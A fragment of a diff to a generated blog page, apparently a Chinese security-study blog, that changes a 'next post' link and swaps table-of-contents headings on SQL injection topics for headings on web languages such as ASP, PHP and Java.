+                                   href="/2024/04/14/05PHP%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"
+                                   title="05PHP个人博客"
                                 >
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">06Web安全攻防01</span>
+                                        <span class="post-nav-title-item text-ellipsis">05PHP个人博客</span>
                                         <span class="post-nav-item">下一篇</span>
                                     </span>
                                     <span class="right arrow-icon flex-center">
@@ -583,7 +683,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web%E6%94%BB%E9%98%B202"><span class="nav-text">Web攻防02</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E"><span class="nav-text">通用安全漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLmap"><span class="nav-text">SQLmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MSSQL"><span class="nav-text">MSSQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PostgreSQL"><span class="nav-text">PostgreSQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Oracle"><span class="nav-text">Oracle</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MongoDB"><span class="nav-text">MongoDB</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-text">数据类型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E6%B3%A8%E5%85%A5"><span class="nav-text">查询方式注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E6%9D%82%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8"><span class="nav-text">复杂注入利用</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web%E6%94%BB%E9%98%B201"><span class="nav-text">Web攻防01</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ASP"><span class="nav-text">ASP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ASPX"><span class="nav-text">ASPX</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP"><span class="nav-text">PHP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Java"><span class="nav-text">Java</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JavaScript"><span class="nav-text">JavaScript</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Python"><span class="nav-text">Python</span></a></li></ol></li></ol>
     </div>
 </div>
 
@@ -755,7 +855,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web%E6%94%BB%E9%98%B202"><span class="nav-text">Web攻防02</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E"><span class="nav-text">通用安全漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLmap"><span class="nav-text">SQLmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MSSQL"><span class="nav-text">MSSQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PostgreSQL"><span class="nav-text">PostgreSQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Oracle"><span class="nav-text">Oracle</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MongoDB"><span class="nav-text">MongoDB</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-text">数据类型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E6%B3%A8%E5%85%A5"><span class="nav-text">查询方式注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E6%9D%82%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8"><span class="nav-text">复杂注入利用</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web%E6%94%BB%E9%98%B201"><span class="nav-text">Web攻防01</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ASP"><span class="nav-text">ASP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ASPX"><span class="nav-text">ASPX</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP"><span class="nav-text">PHP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Java"><span class="nav-text">Java</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JavaScript"><span class="nav-text">JavaScript</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Python"><span class="nav-text">Python</span></a></li></ol></li></ol>
     </div>
 </div>
 
